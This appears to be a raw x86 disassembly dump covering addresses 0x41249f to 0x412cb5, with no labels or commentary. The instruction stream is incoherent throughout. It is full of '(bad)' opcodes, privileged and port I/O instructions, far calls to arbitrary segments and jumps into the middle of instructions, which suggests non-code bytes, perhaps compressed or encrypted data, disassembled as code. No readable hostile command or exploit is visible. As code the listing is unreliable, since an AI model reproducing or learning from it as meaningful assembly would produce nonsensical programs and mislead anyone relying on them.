  41249f:	xor    edx,DWORD PTR [ebp+0x21ac3bed]
  4124a5:	mov    BYTE PTR [edx+0x3e],bl
  4124a8:	(bad)  [bx]
  4124ab:	(bad)  
  4124ac:	pop    esi
  4124ad:	add    al,0x7b
  4124af:	mov    WORD PTR [esi],gs
  4124b1:	xor    eax,0x5278d8b3
  4124b6:	icebp  
  4124b7:	mov    ecx,0x10caf35b
  4124bc:	dec    edi
  4124bd:	mov    ds:0xf3070b87,eax
  4124c2:	aaa    
  4124c3:	pop    edx
  4124c4:	pop    edi
  4124c5:	gs rcr ecx,0xcc
  4124c9:	xor    bl,dl
  4124cb:	in     al,dx
  4124cc:	jnp    0x41245a
  4124ce:	adc    BYTE PTR [edi+0xf],dh
  4124d1:	mov    bh,0x4f
  4124d3:	mov    esp,0x911f171c
  4124d8:	sbb    BYTE PTR [ebx-0xfd4a90c],al
  4124de:	(bad)  
  4124df:	mov    al,ds:0x3f381b19
  4124e4:	mov    ebx,0x504e013a
  4124e9:	mov    dl,0xb2
  4124eb:	lea    edi,[ecx+0x7c37363]
  4124f1:	(bad)  
  4124f2:	or     al,0x12
  4124f4:	aam    0xfd
  4124f6:	or     DWORD PTR [eax+0x21],eax
  4124f9:	push   ebp
  4124fa:	sbb    BYTE PTR [esi],dh
  4124fc:	jne    0x41253c
  4124fe:	jmp    0x4124cb
  412500:	jnp    0x4124aa
  412502:	mov    BYTE PTR [edi+ebx*4-0x4d],0xcc
  412507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412508:	rol    edx,cl
  41250a:	mov    al,ds:0x279b6277
  41250f:	arpl   bp,sp
  412511:	pushf  
  412512:	and    esi,DWORD PTR [ebp-0x59]
  412515:	jnp    0x41255f
  412517:	and    al,bh
  412519:	and    BYTE PTR [edx+0x7bd3d50],cl
  41251f:	dec    eax
  412520:	and    al,0xbc
  412522:	mov    esi,edx
  412524:	outs   dx,DWORD PTR ds:[esi]
  412525:	and    al,0xe0
  412527:	sbb    ebx,esp
  412529:	nop
  41252a:	mov    edi,0x3132c92a
  41252f:	mov    edx,0x27af3748
  412534:	xchg   edi,eax
  412535:	arpl   WORD PTR [edx],si
  412537:	inc    ebx
  412538:	ja     0x4124ff
  41253a:	fucom  st(2)
  41253c:	xor    al,ch
  41253e:	pusha  
  41253f:	and    ecx,DWORD PTR [ebx+0x6065ab2d]
  412545:	mov    edi,0xb665323a
  41254a:	xchg   esi,eax
  41254b:	push   ebp
  41254c:	mov    ah,al
  41254e:	push   esi
  41254f:	repz popa 
  412551:	in     al,0x8a
  412553:	std    
  412554:	jg     0x4125c6
  412556:	adc    BYTE PTR [edx+0x6a],0x62
  41255a:	rcr    DWORD PTR [edi+0x51],0xc9
  41255e:	jp     0x4124ed
  412560:	inc    edi
  412561:	and    BYTE PTR [eax+eax*1-0x7d],ch
  412565:	mov    dl,0x8d
  412567:	adc    cl,0xec
  41256a:	(bad)  
  41256c:	fucomip st,st(5)
  41256e:	jo     0x412581
  412570:	cmp    BYTE PTR [ecx+0x27],ch
  412573:	jnp    0x4125f2
  412575:	aas    
  412576:	aaa    
  412577:	xchg   BYTE PTR [edi],bh
  412579:	xor    eax,0x12ce3cbb
  41257e:	pop    edx
  41257f:	cwde   
  412580:	into   
  412581:	daa    
  412582:	fldenv [esi+edi*1+0x30]
  412586:	fidivr WORD PTR [ebx+0x7f]
  412589:	xchg   edi,eax
  41258a:	push   ds
  41258b:	stc    
  41258c:	loope  0x41255c
  41258e:	dec    ebp
  41258f:	sub    eax,0xa8b1c2de
  412594:	jp     0x41255a
  412596:	popa   
  412597:	(bad)  
  412598:	dec    ebx
  412599:	mov    dl,bh
  41259b:	jnp    0x412611
  41259d:	jbe    0x41253f
  41259f:	pusha  
  4125a0:	push   edx
  4125a1:	out    0x9e,al
  4125a3:	and    esp,edx
  4125a5:	call   0xbb8e:0xece64e98
  4125ac:	dec    eax
  4125ad:	(bad)  
  4125ae:	jmp    0x412613
  4125b0:	sahf   
  4125b1:	sahf   
  4125b2:	sub    DWORD PTR [ecx-0x535b3986],ebp
  4125b8:	sub    BYTE PTR [edx],0xa3
  4125bb:	adc    BYTE PTR [ecx+0x23eb32bb],0xc5
  4125c2:	xchg   ebp,eax
  4125c3:	aad    0xa8
  4125c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125c6:	pop    ds
  4125c7:	xor    BYTE PTR [ecx],al
  4125c9:	push   ebp
  4125ca:	fdivr  QWORD PTR [ebx+ebx*2]
  4125cd:	stos   BYTE PTR es:[edi],al
  4125ce:	pop    edx
  4125cf:	sub    edi,0xc03744a4
  4125d5:	stc    
  4125d6:	mov    eax,0xcc494672
  4125db:	push   0xa05cc3b5
  4125e0:	add    DWORD PTR [ebx],esp
  4125e2:	sub    cl,cl
  4125e4:	pop    es
  4125e5:	jecxz  0x412659
  4125e7:	je     0x41260b
  4125e9:	retf   
  4125ea:	aad    0x52
  4125ec:	mov    dl,0xc1
  4125ee:	test   eax,0x8c6d7675
  4125f3:	or     eax,0x530a1d0
  4125f8:	je     0x412633
  4125fa:	xchg   ebx,eax
  4125fb:	cmp    cl,BYTE PTR [eax+edi*4-0x27461ba]
  412602:	leave  
  412603:	mov    dh,0xe1
  412605:	sbb    ch,0x8
  412608:	adc    bh,BYTE PTR [ebx-0xe]
  41260b:	retf   0x2450
  41260e:	mov    bl,0x26
  412610:	sbb    DWORD PTR [ecx+0x1e],ebx
  412613:	dec    esp
  412614:	loopne 0x4125ab
  412616:	sahf   
  412617:	inc    ecx
  412618:	xor    ch,0xcc
  41261b:	ror    BYTE PTR [ebx],0xdc
  41261e:	mov    eax,ds:0x2156a8ce
  412623:	leave  
  412624:	and    BYTE PTR [ecx],bl
  412626:	adc    DWORD PTR [ebp-0x5c9c64a2],0xf2172bd8
  412630:	add    al,0xad
  412632:	test   eax,0x72003284
  412637:	mov    ecx,0x3ebb5b90
  41263c:	aaa    
  41263d:	hlt    
  41263e:	mov    DWORD PTR [eax+0x55ddc889],esi
  412644:	xchg   ebp,eax
  412645:	cli    
  412646:	pop    edi
  412647:	mov    eax,0x7ce06acd
  41264c:	sub    ecx,edx
  41264e:	js     0x412612
  412650:	jmp    FWORD PTR [ebx+esi*8+0x7e]
  412654:	xchg   esp,eax
  412655:	int    0xdc
  412657:	ja     0x4126ba
  412659:	in     al,0x9b
  41265b:	daa    
  41265c:	push   0xffffffa2
  41265e:	mov    BYTE PTR [ecx-0x9eb168d],bl
  412664:	pop    esp
  412665:	adc    ebp,ebp
  412667:	jge    0x412601
  412669:	scas   eax,DWORD PTR es:[edi]
  41266a:	mov    esi,0x6bfb2aa6
  41266f:	or     bh,BYTE PTR [ecx]
  412671:	sbb    al,BYTE PTR [eax+edi*1]
  412674:	mov    bl,0xd7
  412676:	rcl    eax,cl
  412678:	push   edi
  412679:	stos   BYTE PTR es:[edi],al
  41267a:	cmp    dh,BYTE PTR [ecx+0x2f]
  41267d:	sbb    eax,0x44af139
  412682:	xor    al,0x1f
  412684:	xor    edx,DWORD PTR [ebx]
  412686:	adc    BYTE PTR [ebx-0x3f],dh
  412689:	lock loopne 0x412661
  41268c:	stc    
  41268d:	cmp    DWORD PTR [eax],ebx
  41268f:	inc    ecx
  412690:	xor    dl,al
  412692:	pusha  
  412693:	push   ecx
  412694:	push   ss
  412695:	ins    WORD PTR es:[edi],dx
  412697:	adc    BYTE PTR [eax+esi*4+0xa196fcd],0x9a
  41269f:	jne    0x41269a
  4126a1:	add    al,0xaf
  4126a3:	mov    al,ds:0xf3860894
  4126a8:	imul   BYTE PTR [ecx+0x37]
  4126ab:	rcl    DWORD PTR [esi-0x176ffbf4],1
  4126b1:	sbb    ch,bl
  4126b3:	jno    0x4126b5
  4126b5:	imul   ecx,DWORD PTR [esi-0x32],0xa07d1825
  4126bc:	std    
  4126bd:	loopne 0x4126af
  4126bf:	ficomp DWORD PTR [eax+eax*2]
  4126c2:	pop    esi
  4126c3:	es mov ecx,0x67ada03
  4126c9:	loope  0x41271f
  4126cb:	adc    BYTE PTR [ecx+0x35],bl
  4126ce:	mov    eax,ds:0x81a42735
  4126d3:	inc    esi
  4126d4:	add    eax,0xb944ca17
  4126d9:	rcl    eax,0x33
  4126dc:	xor    al,0x75
  4126de:	repz fs xchg dl,dl
  4126e2:	dec    esp
  4126e3:	out    0x70,al
  4126e5:	inc    eax
  4126e6:	jle    0x4126f8
  4126e8:	xchg   esi,eax
  4126e9:	mov    eax,ds:0xa281f9d1
  4126ee:	mov    dh,0x4b
  4126f0:	sub    BYTE PTR ds:0x7073c6c2,cl
  4126f6:	std    
  4126f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126f8:	icebp  
  4126f9:	jnp    0x4126dd
  4126fb:	test   DWORD PTR [edi+ebp*8],0x5e01f148
  412702:	sbb    edx,DWORD PTR ds:0x4135924d
  412708:	xchg   ebp,eax
  412709:	imul   edx,DWORD PTR cs:[ebp+0x2ad47c5f],0xffffff97
  412711:	(bad)  
  412712:	(bad)  
  412713:	je     0x412699
  412715:	neg    DWORD PTR [ecx+edi*8-0x46d87dad]
  41271c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41271d:	push   cs
  41271e:	lds    ebp,FWORD PTR [esi-0x44340f40]
  412724:	mov    dl,0x94
  412726:	mov    WORD PTR [ecx-0x3d7ef5db],cs
  41272c:	repnz (bad) 
  41272e:	mov    dl,0x25
  412730:	dec    ecx
  412731:	in     eax,0xe8
  412733:	sete   BYTE PTR [esi-0x39]
  412737:	int    0x28
  412739:	jns    0x412727
  41273b:	mov    ds:0xc3133e18,eax
  412740:	(bad)  
  412741:	pop    ecx
  412742:	gs mov esi,0xaba8b1d6
  412748:	int    0x2d
  41274a:	mov    esi,0x3c2cafef
  41274f:	pop    eax
  412750:	clc    
  412751:	add    al,0x26
  412753:	xor    eax,0x8e267aea
  412758:	adc    BYTE PTR [edx],ah
  41275a:	or     al,0x91
  41275c:	and    DWORD PTR [ecx-0x6c],esp
  41275f:	pop    es
  412760:	or     BYTE PTR cs:[ecx+0x70],al
  412764:	or     cl,ch
  412766:	push   ebx
  412767:	or     edx,ebx
  412769:	ficomp WORD PTR [esi-0x30]
  41276c:	in     eax,dx
  41276d:	cmp    ch,bl
  41276f:	es je  0x41278f
  412772:	cmp    edx,DWORD PTR [edx]
  412774:	test   BYTE PTR [eax+0x5587403c],0x85
  41277b:	adc    eax,0x81b3710d
  412780:	jns    0x412714
  412782:	shl    BYTE PTR [ebx+0x1b],1
  412785:	les    edi,FWORD PTR [ecx-0x1781bac9]
  41278b:	fsub   QWORD PTR [ebx+0x14be0c6a]
  412791:	in     al,0x29
  412793:	aaa    
  412794:	jmp    0xd57b:0x47f832a5
  41279b:	adc    cl,BYTE PTR ds:0xf3bdcf10
  4127a1:	add    eax,DWORD PTR [esi]
  4127a3:	xchg   edx,eax
  4127a4:	adc    eax,0x472df471
  4127a9:	jp     0x41276a
  4127ab:	(bad)  
  4127ac:	(bad)  
  4127ad:	mov    BYTE PTR ds:[ecx],al
  4127b0:	inc    edx
  4127b1:	in     eax,0x27
  4127b3:	retf   
  4127b4:	loope  0x412776
  4127b6:	retf   0x14d9
  4127b9:	in     eax,dx
  4127ba:	sbb    bh,BYTE PTR [eax+0xaf9c0f5]
  4127c0:	fisubr DWORD PTR [eax-0x30]
  4127c3:	std    
  4127c4:	enter  0xf295,0x55
  4127c8:	inc    edi
  4127c9:	sbb    BYTE PTR [edx+eax*2],bl
  4127cc:	shr    DWORD PTR [edx+eiz*8],cl
  4127cf:	shr    BYTE PTR [eax+0x19],cl
  4127d2:	or     eax,0xf8ec55da
  4127d7:	cmp    eax,0xcecd9f55
  4127dc:	lds    edi,FWORD PTR [eax-0x35]
  4127df:	mov    ah,0x5c
  4127e1:	add    al,0x7
  4127e3:	inc    edx
  4127e4:	push   0xb06337e7
  4127e9:	ss pop esi
  4127eb:	xchg   edi,eax
  4127ec:	(bad)  
  4127ed:	or     ecx,DWORD PTR [ebx-0x28]
  4127f0:	jnp    0x4127a7
  4127f2:	jp     0x41283b
  4127f4:	push   ds
  4127f5:	mov    eax,ds:0xf003f79a
  4127fa:	inc    ebx
  4127fb:	inc    eax
  4127fc:	adc    BYTE PTR [ebp-0x5908655],0x75
  412803:	cmp    BYTE PTR [eax],ah
  412805:	adc    eax,0x86640380
  41280a:	and    eax,0xeb2ee7f9
  41280f:	jo     0x4127ae
  412811:	fs dec esi
  412813:	mov    eax,0x1dd55613
  412818:	addr16 sub eax,0x499ca51b
  41281e:	retf   0x54aa
  412821:	inc    ebp
  412822:	test   edx,0xc2ef4edd
  412828:	push   es
  412829:	cmp    al,0xd7
  41282b:	call   0x164bd1a2
  412830:	mov    bl,0x4b
  412832:	pop    ebp
  412833:	xsetbv 
  412836:	loop   0x4127bc
  412838:	mov    esp,0x1e38ca21
  41283d:	adc    al,0xf9
  41283f:	call   0x6351:0xb9ddcbb
  412846:	xor    ebp,DWORD PTR [ebx+0x4]
  412849:	(bad)  
  41284a:	cli    
  41284b:	into   
  41284c:	jecxz  0x412819
  41284e:	sbb    dh,BYTE PTR [edx+edx*8-0x424f4348]
  412855:	jns    0x412808
  412857:	mov    esp,0x72576c7c
  41285c:	mov    ebx,0xd179a20d
  412861:	mov    bl,ah
  412863:	lods   al,BYTE PTR ds:[esi]
  412864:	enter  0x591,0x26
  412868:	push   ds
  412869:	xor    eax,DWORD PTR [ecx-0x27]
  41286c:	or     BYTE PTR [esi],al
  41286e:	addr16 push eax
  412870:	xchg   ebx,eax
  412871:	(bad)  
  412873:	inc    esi
  412874:	enter  0xe446,0x66
  412878:	aas    
  412879:	jmp    0x10cc436a
  41287e:	fs ss div cl
  412882:	jl     0x412813
  412884:	jo     0x412854
  412886:	inc    ecx
  412887:	dec    ebp
  412888:	call   0xc209:0x6bb45fcb
  41288f:	out    0x57,eax
  412891:	out    0xe7,eax
  412893:	cmp    al,0x89
  412895:	sahf   
  412896:	adc    al,0x1c
  412898:	add    DWORD PTR [ebx+0x27],0xffffffd2
  41289c:	rcr    dh,cl
  41289e:	leave  
  41289f:	cmp    bh,cl
  4128a1:	pop    ecx
  4128a2:	pop    edi
  4128a3:	or     DWORD PTR [ecx+0xa],edx
  4128a6:	mov    edx,0xf9bca816
  4128ab:	inc    ebp
  4128ac:	(bad)  
  4128ad:	es mov edi,0x99cd60f3
  4128b3:	xor    DWORD PTR [edi+ebp*1+0x41],ecx
  4128b7:	loop   0x4128d6
  4128b9:	cmp    BYTE PTR [ebx-0x2fa6613],0x5d
  4128c0:	cld    
  4128c1:	outs   dx,DWORD PTR ds:[esi]
  4128c2:	mov    cl,0x52
  4128c4:	jmp    0x41292c
  4128c6:	or     DWORD PTR [eax+0x9c8701a],eax
  4128cc:	jns    0x4128ce
  4128ce:	jge    0x412900
  4128d0:	xchg   ebp,eax
  4128d1:	dec    si
  4128d3:	xor    al,al
  4128d5:	inc    eax
  4128d6:	outs   dx,DWORD PTR ds:[esi]
  4128d7:	push   0x5adaad0d
  4128dc:	and    al,0xf9
  4128de:	xor    eax,0x5821c96a
  4128e3:	xchg   edx,eax
  4128e4:	pop    esi
  4128e5:	pusha  
  4128e6:	dec    edx
  4128e7:	aas    
  4128e8:	mov    edi,0xa4532f1d
  4128ed:	data16 test BYTE PTR [ecx],bl
  4128f0:	and    eax,0x10c9f94b
  4128f5:	adc    DWORD PTR [eax-0x7c],0x76
  4128f9:	pop    ecx
  4128fa:	xor    dl,bh
  4128fc:	jnp    0x412883
  4128fe:	fidivr WORD PTR [edx-0x383825cb]
  412904:	cwde   
  412905:	sbb    DWORD PTR [esi],0x5b
  412908:	xchg   BYTE PTR [edi+0x4e],dh
  41290b:	fdiv   st(4),st
  41290d:	hlt    
  41290e:	int    0x8a
  412910:	sahf   
  412911:	nop
  412912:	mov    cl,0x4f
  412914:	pushf  
  412915:	sbb    eax,0x4c169a87
  41291a:	cmc    
  41291b:	lods   eax,DWORD PTR ds:[esi]
  41291c:	les    edx,FWORD PTR [ebx-0xa39e4f2]
  412922:	sub    eax,0x6f10b960
  412927:	cmc    
  412928:	fisubr WORD PTR ds:0x9e9bf06f
  41292e:	mov    ebp,0x8b547313
  412933:	lahf   
  412934:	inc    eax
  412935:	mov    ch,0x7
  412937:	cmp    eax,0x8093238c
  41293c:	repnz rcr BYTE PTR [edx],1
  41293f:	push   edx
  412940:	mov    esi,0xaeb2f27b
  412945:	mov    dh,0x6b
  412947:	mov    dl,0x42
  412949:	or     ch,dl
  41294b:	or     al,0x48
  41294d:	xchg   ecx,eax
  41294e:	pop    ebx
  41294f:	push   edx
  412950:	mov    cl,0x11
  412952:	xchg   ebp,eax
  412953:	iret   
  412954:	add    ebx,DWORD PTR [edi-0x45d19082]
  41295a:	jnp    0x4129ab
  41295c:	or     ebp,esp
  41295e:	dec    esi
  41295f:	mov    esi,0xfa456b5c
  412964:	pop    esi
  412965:	shl    DWORD PTR [ecx+0x7c],cl
  412968:	mov    edi,0xcc03d587
  41296d:	inc    ebx
  41296e:	add    dl,BYTE PTR [ebx]
  412970:	cmp    al,0x76
  412972:	dec    eax
  412973:	lods   al,BYTE PTR ds:[esi]
  412974:	scas   al,BYTE PTR es:[edi]
  412975:	dec    edi
  412976:	imul   ecx,esi,0x9a51620e
  41297c:	inc    eax
  41297d:	xchg   edx,eax
  41297e:	add    BYTE PTR [edi+ebx*4+0x49],dh
  412982:	adc    BYTE PTR [esi+0x23],al
  412985:	jp     0x412938
  412987:	ret    
  412988:	stc    
  412989:	pop    edx
  41298a:	ret    
  41298b:	mov    al,ds:0x8ee3a28f
  412990:	sbb    al,0x2e
  412992:	jle    0x4129b2
  412994:	out    0xe9,al
  412996:	push   ds
  412997:	sbb    ah,ah
  412999:	xlat   BYTE PTR ds:[ebx]
  41299a:	fwait
  41299b:	nop
  41299c:	sbb    DWORD PTR [edi-0x6c],ecx
  41299f:	push   es
  4129a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129a1:	cmp    al,0xc0
  4129a3:	xor    edi,DWORD PTR [ebx+esi*2+0x28f8eec5]
  4129aa:	push   0xada28523
  4129af:	xchg   DWORD PTR [ecx+0x32],ecx
  4129b2:	add    DWORD PTR [esi-0x6798e847],esp
  4129b8:	sub    DWORD PTR [edx-0x6c],eax
  4129bb:	outs   dx,BYTE PTR ds:[esi]
  4129bc:	xor    DWORD PTR [edi-0x4c],ebp
  4129bf:	adc    edi,DWORD PTR [edx+0x22]
  4129c2:	inc    edi
  4129c3:	nop
  4129c4:	ror    BYTE PTR [edx+ebx*8],0x81
  4129c8:	xchg   esp,eax
  4129c9:	sbb    DWORD PTR [edx-0x2523ba56],edx
  4129cf:	sbb    al,0xb7
  4129d1:	jb     0x4129ab
  4129d3:	out    0x11,eax
  4129d5:	or     eax,0xeaf80a12
  4129da:	jo     0x412a3b
  4129dc:	pop    es
  4129dd:	call   0xdfb5cc6f
  4129e2:	pop    eax
  4129e3:	inc    edi
  4129e4:	jns    0x4129ff
  4129e6:	mov    ecx,0x4e478c44
  4129eb:	adc    cl,BYTE PTR [ebx-0x7885b366]
  4129f1:	mov    BYTE PTR [ecx+0x32],0x76
  4129f5:	jne    0x412981
  4129f7:	mov    edx,0x9aa33559
  4129fc:	(bad)  
  4129fd:	or     DWORD PTR [ecx+0x3d226535],ebx
  412a03:	jb     0x4129f5
  412a05:	dec    esi
  412a06:	pop    es
  412a07:	mov    al,0x85
  412a09:	jae    0x412a2e
  412a0b:	call   0xac93:0xa3c55da7
  412a12:	je     0x412a05
  412a14:	stc    
  412a15:	pop    ecx
  412a16:	sti    
  412a17:	xor    dh,dl
  412a19:	add    eax,0xacc3064
  412a1e:	and    ebp,DWORD PTR [esi]
  412a20:	fs stos DWORD PTR es:[edi],eax
  412a22:	jl     0x412a35
  412a24:	mov    bl,ch
  412a26:	fcomp  DWORD PTR [edi]
  412a28:	sbb    BYTE PTR [ecx+0x93c6e10],dl
  412a2e:	fiadd  DWORD PTR [eax]
  412a30:	clc    
  412a31:	mov    DWORD PTR [ebx+0x33],esi
  412a34:	xchg   bl,al
  412a36:	idiv   DWORD PTR [edi-0x62]
  412a39:	fsub   QWORD PTR [ebp+0x20]
  412a3c:	scas   al,BYTE PTR es:[edi]
  412a3d:	xor    ch,BYTE PTR [esi+ebp*2+0x6db6c3f5]
  412a44:	xchg   ebp,eax
  412a45:	jbe    0x412a2b
  412a47:	pop    edi
  412a48:	mov    ch,0xa0
  412a4a:	dec    ebx
  412a4b:	xor    BYTE PTR [edx+esi*2-0x21094817],dh
  412a52:	imul   edi,DWORD PTR [ebx],0x8fff14f4
  412a58:	add    eax,0x9850b241
  412a5d:	shr    DWORD PTR [esi],cl
  412a5f:	sub    eax,DWORD PTR [ebp+0x50]
  412a62:	pop    esp
  412a63:	mov    cl,0xd1
  412a65:	out    0x5c,eax
  412a67:	rcl    BYTE PTR [edx],cl
  412a69:	clc    
  412a6a:	mov    eax,ds:0xba47c6fd
  412a6f:	xchg   DWORD PTR ds:0xfb63f312,ebp
  412a75:	loopne 0x412ac9
  412a77:	add    eax,DWORD PTR [esi]
  412a79:	stc    
  412a7a:	pop    ss
  412a7b:	adc    DWORD PTR [ebx+0x76],esi
  412a7e:	arpl   WORD PTR ss:0xd82db707,dx
  412a85:	iret   
  412a86:	enter  0x3ca8,0xab
  412a8a:	cmp    BYTE PTR [esi],dh
  412a8c:	dec    esp
  412a8d:	loop   0x412ac7
  412a8f:	push   eax
  412a90:	push   esp
  412a91:	pop    ds
  412a92:	jo     0x412a78
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	xor    BYTE PTR [ebx-0x1d0cded9],ah
  412a9b:	clc    
  412a9c:	ficom  DWORD PTR [ebx+eiz*2+0x8]
  412aa0:	nop
  412aa1:	pushf  
  412aa2:	dec    ebx
  412aa3:	test   DWORD PTR [esi],esi
  412aa5:	test   esp,0x8abadccf
  412aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aac:	jb     0x412aa8
  412aae:	aad    0xaa
  412ab0:	dec    edi
  412ab1:	outs   dx,DWORD PTR ds:[esi]
  412ab2:	push   0xd3eaa973
  412ab7:	xchg   esp,eax
  412ab8:	scas   eax,DWORD PTR es:[edi]
  412ab9:	rol    BYTE PTR [eax],1
  412abb:	sub    eax,0xe99e72e8
  412ac0:	ret    0xdafd
  412ac3:	sub    ecx,DWORD PTR [ebx+0x1a]
  412ac6:	stc    
  412ac7:	push   ebx
  412ac8:	xchg   ebp,eax
  412ac9:	inc    eax
  412acb:	in     eax,0xa1
  412acd:	ins    DWORD PTR es:[edi],dx
  412ace:	pusha  
  412acf:	mov    bh,cl
  412ad1:	add    eax,0xd7562e2e
  412ad6:	ins    BYTE PTR es:[edi],dx
  412ad7:	pop    esi
  412ad8:	aas    
  412ad9:	imul   esp,DWORD PTR [esi-0x2f],0xffffffea
  412add:	add    eax,0x5681b155
  412ae2:	mov    eax,ds:0xe49001fc
  412ae7:	jmp    0x1ea5:0x9a7c4d74
  412aee:	nop
  412aef:	push   esi
  412af0:	pop    eax
  412af1:	xchg   ebx,esi
  412af3:	and    eax,0xa3ae87f7
  412af8:	and    eax,0x89dfa71b
  412afd:	inc    ebp
  412afe:	mov    ecx,0x4601fc85
  412b03:	add    eax,esp
  412b05:	cmp    al,BYTE PTR [eax]
  412b07:	jo     0x412b68
  412b09:	or     dl,dh
  412b0b:	mov    BYTE PTR [edi+esi*1+0x690a5d50],0x40
  412b13:	xchg   ebx,edx
  412b15:	dec    ebp
  412b16:	xor    dl,0xb8
  412b19:	stos   BYTE PTR es:[edi],al
  412b1a:	jmp    0xf0bb:0x584ce226
  412b21:	iret   
  412b22:	ins    DWORD PTR es:[edi],dx
  412b23:	stos   BYTE PTR es:[edi],al
  412b24:	fiadd  DWORD PTR [ebx+ebp*4+0x8]
  412b28:	lods   eax,DWORD PTR ds:[esi]
  412b29:	cmp    eax,0x9f0fef9c
  412b2e:	and    al,0xbc
  412b30:	push   ds
  412b31:	lds    ecx,FWORD PTR [eax]
  412b33:	mov    esp,0x48d2328a
  412b38:	mov    WORD PTR [esi-0x5a],?
  412b3b:	lods   al,BYTE PTR ds:[esi]
  412b3c:	jl     0x412b88
  412b3e:	fadd   QWORD PTR [edx-0x41]
  412b41:	pop    ds
  412b42:	jbe    0x412b5d
  412b44:	or     eax,0xebd0d5fa
  412b49:	jle    0x412ba2
  412b4b:	push   ecx
  412b4c:	sahf   
  412b4d:	jne    0x412b8f
  412b4f:	xor    DWORD PTR [eax+0x231a15e8],ebp
  412b55:	pop    esp
  412b56:	fsubr  DWORD PTR ds:0xd99ee024
  412b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b5d:	sahf   
  412b5e:	test   al,0x88
  412b60:	push   edx
  412b61:	and    BYTE PTR [ebx-0x5a],ah
  412b64:	out    dx,eax
  412b65:	in     eax,dx
  412b66:	fs jge 0x412b16
  412b69:	outs   dx,DWORD PTR ds:[esi]
  412b6a:	cdq    
  412b6b:	and    DWORD PTR [ebp+esi*8-0x55],ecx
  412b6f:	lahf   
  412b70:	dec    eax
  412b71:	push   ebp
  412b72:	add    edi,DWORD PTR [edi+0x1b]
  412b75:	push   ecx
  412b76:	cmp    dh,BYTE PTR [eax+0x6301c718]
  412b7c:	push   esi
  412b7d:	retf   0x244f
  412b80:	jp     0x412bc2
  412b82:	inc    ebx
  412b83:	dec    DWORD PTR [edx-0x24233d1f]
  412b89:	std    
  412b8a:	mov    dl,0x88
  412b8c:	push   es
  412b8d:	leave  
  412b8e:	mov    bh,0x7c
  412b90:	sub    eax,0xac1a77d
  412b95:	bound  ecx,QWORD PTR [edi]
  412b97:	pop    ds
  412b98:	inc    ebx
  412b99:	mov    bh,BYTE PTR [ebp-0x18d94abb]
  412b9f:	xchg   BYTE PTR [ebx-0x37],bl
  412ba2:	fld    TBYTE PTR [edi]
  412ba4:	fidiv  DWORD PTR [eax+0x2f268545]
  412baa:	xor    eax,0x63be3316
  412baf:	aad    0xbd
  412bb1:	cmp    DWORD PTR [ebp-0x7e42a185],esi
  412bb7:	add    cl,ah
  412bb9:	pop    esi
  412bba:	mov    ds:0x7445387d,eax
  412bbf:	ret    0x2b18
  412bc2:	ins    BYTE PTR es:[edi],dx
  412bc3:	(bad)  [edx-0x56]
  412bc6:	sti    
  412bc7:	mov    al,ds:0xa0ff4502
  412bcc:	jne    0x412b8c
  412bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bcf:	cdq    
  412bd0:	mov    ebp,DWORD PTR [eax-0x3364d8cf]
  412bd6:	sbb    ah,BYTE PTR [ebp+0x23]
  412bd9:	retf   0xbf60
  412bdc:	push   ss
  412bdd:	(bad)  
  412bde:	aaa    
  412bdf:	mov    WORD PTR [ebp+0x57],es
  412be2:	sbb    DWORD PTR [edx-0x2510de31],0x1702b07d
  412bec:	push   ecx
  412bed:	retf   
  412bee:	mov    eax,0xb41606f8
  412bf3:	out    0x21,al
  412bf5:	call   0xa7ca:0xe7697848
  412bfc:	mov    edi,0x4bddb07
  412c01:	clc    
  412c02:	add    al,0x0
  412c04:	sbb    bh,BYTE PTR [edx]
  412c06:	test   BYTE PTR [edi],al
  412c08:	push   ss
  412c09:	mov    DWORD PTR [eax+ecx*4-0x66],esp
  412c0d:	push   cs
  412c0e:	loop   0x412c49
  412c10:	fistp  WORD PTR [eax+ebx*8-0x66]
  412c14:	mov    ds:0x9e76634f,al
  412c19:	fiadd  DWORD PTR [ecx-0x3318bd8d]
  412c1f:	dec    ebp
  412c20:	lock mov edi,0xf29ee288
  412c26:	sar    DWORD PTR [eax],cl
  412c28:	ins    DWORD PTR es:[edi],dx
  412c29:	sbb    ch,bl
  412c2b:	ret    
  412c2c:	test   eax,0xb4a96cc4
  412c31:	in     al,dx
  412c32:	loop   0x412c42
  412c34:	(bad)  
  412c35:	xchg   ecx,eax
  412c36:	jo     0x412bc4
  412c38:	sbb    bh,0xe3
  412c3b:	mov    BYTE PTR [esi+0x7f],al
  412c3e:	sti    
  412c3f:	cmp    dh,ah
  412c41:	jns    0x412bfa
  412c43:	mov    edx,0xc7997fb
  412c48:	inc    ebx
  412c49:	popa   
  412c4a:	inc    ebx
  412c4b:	adc    eax,0xafb84388
  412c50:	mov    al,ds:0xb65162d6
  412c55:	retf   
  412c56:	lahf   
  412c57:	test   ah,bl
  412c59:	mov    WORD PTR [eax-0x734c7b99],fs
  412c5f:	dec    esp
  412c60:	jg     0x412c3b
  412c62:	push   0x58
  412c64:	test   DWORD PTR ds:0xf100ef18,ebp
  412c6a:	xchg   ebp,eax
  412c6b:	pushf  
  412c6c:	in     eax,dx
  412c6d:	adc    dl,bl
  412c6f:	and    ebp,DWORD PTR [ecx+0x671686fe]
  412c75:	out    0x87,eax
  412c77:	rep ins BYTE PTR es:[edi],dx
  412c79:	fs ret 0x4331
  412c7d:	test   al,0xd1
  412c7f:	mov    dl,BYTE PTR [edx-0x219864f4]
  412c85:	ss ins BYTE PTR es:[edi],dx
  412c87:	mov    ch,0xa5
  412c89:	shl    DWORD PTR [ebx+ebx*2+0x4c],1
  412c8d:	push   eax
  412c8e:	inc    ebp
  412c8f:	jnp    0x412c6f
  412c91:	xor    DWORD PTR [ebx+0x67e72115],esp
  412c97:	shl    BYTE PTR [esi-0x59],1
  412c9a:	mov    edx,0x32c0dda1
  412c9f:	lahf   
  412ca0:	popa   
  412ca1:	fisttp DWORD PTR ds:0xaf967234
  412ca7:	jl     0x412cb3
  412ca9:	mov    edi,0xa00e25e6
  412cae:	mov    ch,al
  412cb0:	sub    al,0x68
  412cb2:	fadd   QWORD PTR cs:[eax]
  412cb5:	mov    ch,0x62
